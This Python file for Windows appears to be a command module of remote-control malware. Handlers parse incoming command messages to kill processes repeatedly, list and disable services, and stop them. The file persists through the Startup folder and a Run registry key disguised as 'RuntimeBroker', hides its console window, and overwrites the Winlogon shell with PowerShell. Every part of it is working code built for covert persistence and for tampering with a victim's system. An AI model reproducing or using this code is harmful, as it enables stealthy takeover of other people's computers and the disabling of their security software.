import os
import shutil
import subprocess
import sys
import time
import winreg
import win32console
import win32gui
import psutil
import threading
from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, OpenKey, SetValueEx

def kill_process_cmd(message):
    try:
        pid = message.split(" ")[1]
        return kill_process(pid)
    except Exception as e: return f"Error in kill_process_cmd(): {e}"
    
def kill_process(pid):
    try:
        pid = str(pid)
        subprocess.run(['taskkill', '/F', '/PID', pid], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return f"Succesfully killed process: {pid}"
    except subprocess.CalledProcessError as e: return f"Called Process Error in kill_process(): {e}"
    except Exception as e: return f"Error in kill_process(): {e}"
    
def get_all_pids_by_name(name):
    try:
        pids = []
        name = name.lower()
        for proc in psutil.process_iter(['pid', 'name']):
            if name in proc.info['name'].lower():
                pids.append(proc.info['pid'])
        return pids
    except Exception: return None
    
def kill_all_processes_by_name(message):
    try:
        name = message.split(" ")[1]
        pids = get_all_pids_by_name(name)
        for pid in pids: kill_process(pid)
    except Exception as e: return f"Error in kill by name: {e}"

def repeat_kill_by_name_thread(name, quantity, time_rep):
    for _ in range(quantity):
        try:
            kill_all_processes_by_name(f"_ {name}")
            time.sleep(time_rep)
        except: pass

def repeat_kill_by_name(message):
    try:
        args = message.split(" ")
        name = args[1]
        quantity = int(args[2])
        if len(args) == 4: time_rep = int(args[3])
        else: time_rep = 7

        t = threading.Thread(target=repeat_kill_by_name_thread, args=[name, quantity, time_rep])
        t.start()
        return f"Started repeat_kill thread"
    except Exception as e: return f"Error in repeat_kill_by_name(): {e}"

def processes(message):
    try:
        split = message.split(" ")
        params = len(split) == 2
        finalstr = ""
        for proc in psutil.process_iter(['pid', 'name']):
            if not params or (params and split[1].lower() in proc.info['name'].lower()):
                finalstr += f"PID: {proc.info['pid']}, Name: {proc.info['name']}\n"
    except Exception as e: return f"Error in processes(): {e}"
    return finalstr

def get_all_services():
    try: return list(psutil.win_service_iter())
    except: return None

def stop_service(service_name):
    try:
        subprocess.run(['sc', 'config', service_name, "start=", "disabled"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        subprocess.run(['sc', 'stop', service_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return f"Succesfully stopped service: {service_name}"
    except subprocess.CalledProcessError as e: return f"Called Process Error in stop_service(): {e}"
    except Exception as e: return f"Error in stop_service(): {e}"
    
def stop_service_cmd(message):
    try:
        service_name = message.split(" ")[1]
        return stop_service(service_name)
    except Exception as e: return f"Error in stop_service_cmd(): {e}"

def get_all_services_cmd(message):
    try:
        running = False
        if len(message.split(" ")) > 1: running = True

        services = get_all_services()
        final = ""
        for s in services:
            if (running and s.status() == "running") or not running:
                final += f"Name: {s.name()}, DisplayName: {s.display_name()}, Status: {s.status()}\n"
        return final
    except Exception as e: return f"Error in get_all_services_cmd(): {e}"

def add_to_startup_1():
    try:
        script_path = os.path.abspath(sys.argv[0])
        shutil.copy(script_path, f"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
        return "Add to startup folder Success"
    except Exception as e: return f"Error in add_to_startup_1(): {e}"

def add_to_startup_2():
    try:
        key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
        script_path = os.path.abspath(sys.argv[0])
        SetValueEx(key2change, "RuntimeBroker", 0, REG_SZ, script_path)
    except Exception as e: return f"Error occured in add_to_startup_2(): {e}"
    return "Successfully added startup regkey"

def hide():
    try:
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
    except: pass

def set_powershell_shell(_):
    try:
        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        value_name = "Shell"
        powershell_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, powershell_path)
        winreg.CloseKey(key)
        return "Shell changed to PowerShell. Restart the computer for changes to take effect."
    except Exception as e: return f"Error in set_powershell_shell(): {e}"
